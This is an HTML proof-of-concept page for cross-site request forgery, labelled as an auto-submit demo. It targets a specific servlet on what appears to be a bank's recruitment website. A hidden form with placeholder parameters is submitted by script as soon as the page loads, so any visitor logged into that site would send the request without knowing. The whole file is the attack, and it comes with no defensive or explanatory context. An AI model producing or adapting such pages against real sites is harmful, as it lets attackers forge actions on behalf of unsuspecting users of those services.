<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <title>CSRF PoC Demo - 自动提交</title>
</head>
<body>

    <form id="csrfForm" method="POST" action="https://zhaopin.shengjingbank.com.cn:8080/servlet/hirelogin/HireCloseBrowse">
        <input type="hidden" name="param1" value="value1">
        <input type="hidden" name="param2" value="value2">
    </form>

    <script>
        // 页面加载完成后立即自动提交表单
        window.onload = function() {
            document.getElementById("csrfForm").submit();
        };

        // 或者使用更简洁的方式（推荐）
        // document.getElementById("csrfForm").submit();
    </script>

</body>
</html>
